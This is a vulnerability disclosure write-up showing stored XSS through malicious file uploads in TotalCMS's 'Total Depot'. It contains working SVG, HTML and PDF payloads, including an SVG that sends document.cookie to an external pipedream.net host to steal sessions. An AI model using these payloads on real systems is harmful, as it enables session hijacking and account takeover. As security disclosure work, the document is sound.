# TotalCMS Arbitrary File Upload - XSS and steal cookies

## Author: (Sergio)

**Description:** TotalCMS is affected by Arbitrary File Upload - XSS vulnerability which allows Cross-Site Scriting (XSS) and also stealing session cookies

**Attack Vectors:** A vulnerability in "Total Depot" file upload sanitation allows you to upload a PDF / SVG /HTML file with hidden alert Cross-Site scripting (XSS) and steal the user cookies.

---

I am going to do 2 PoCS:
### - POC 1: Cross-Site scripting (XSS) PDF / SVG and HTML files

### - POC 2: Theft of user cookies and forwarding to an external server to intercept them and impersonate the user.


We start with the first PoC:

### POC 1: Cross-Site scripting (XSS) PDF / SVG and HTML files


When logging into the admin panel (https://www.totalcms.co/demo/total-cms/admin/), we will go to the "Total Depot" off the Administration Site and we upload the PDF/ SVG/ and HTML files with the hidden XSS.


There is the payloads:

### XSS PDF Payload:

It is an XSS payload generated with the JS2PDFInjector tool and a js payload that contains the following content:

```js
app.alert("XSS");
```

### SVG Payload:

```js
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(document.location);
   </script>
</svg>
```

### HTML Payload:

```js
<html>
	<script>
		alert(document.cookie);
	</script>
</html>
```


![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/59567372-3336-4efd-aa24-2293ee2018c3)



![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/bfbddc70-9021-4fdb-9ed5-63eed29f25ce)


Once uploaded, if we click on the link we can see the path where they are stored:

![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/eedf4cdb-6401-4e64-8cab-479f9cedfcec)


PATH of the files:


![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/fc975779-4e50-4408-8947-42927049faf1)


![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/9dec0ba5-17e9-4ddb-b917-2657b1ee21ed)


![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/8a1be3fe-bbb8-47e3-8d4f-5933df2af82a)



And this is the result with the Cross-Site Scripting (XSS) of the 3 types of files and with the user's cookies:


![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/f5ef6c07-c3ee-44fd-b999-266a654d8d29)


![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/ce05700f-1dda-4275-a40a-1944bef4bb36)


![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/8e84bc6e-e5f0-43b5-9f63-b93a41167baa)



We continue with the second PoC:


### - POC 2: Theft of user cookies and forwarding to an external server to intercept them and impersonate the user.

We perform a test to see if we have communication with an external server.


There is the payload:

```js
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC
"-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="200"        
height="200"        
zoomAndPan="disable"        
xmlns="http://www.w3.org/2000/svg"        
xmlns:xlink="http://www.w3.org/1999/xlink"        
xml:space="preserve">
<!-- Script linked from the outside-->     
<script xlink:href="https://enbjn0l9vbowi.x.pipedream.net/" />     
<script>       
//<![CDATA[         
alert("XSS");       
]]>     
</script>   
</svg>
```

![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/eaa232df-c43d-48a7-a75a-653b86f55f9f)


![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/ffd7cced-e6a5-4034-ace5-8e2729523f85)


As we see in the pipedream Request, we have obtained the request correctly.


We modify the payload to steal cookies and send them to the pipedream Request, so that we can impersonate the user.


There is the payload:

```js
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC
"-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="200"        
height="200"        
zoomAndPan="disable"        
xmlns="http://www.w3.org/2000/svg"        
xmlns:xlink="http://www.w3.org/1999/xlink"        
xml:space="preserve">
<!-- Script linked from the outside-->     
<script>
  fetch('https://enbjn0l9vbowi.x.pipedream.net/', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>   
</svg>
```

![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/f4ac2d48-f957-4c5d-a173-053ba3097aec)


![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/278638ac-2794-4c88-a165-01914e18d449)


As we see in the image, we have correctly obtained the user's session cookies.













</br>

### Additional Information:
[http://www.cmsmadesimple.org/](https://www.totalcms.co/)

https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
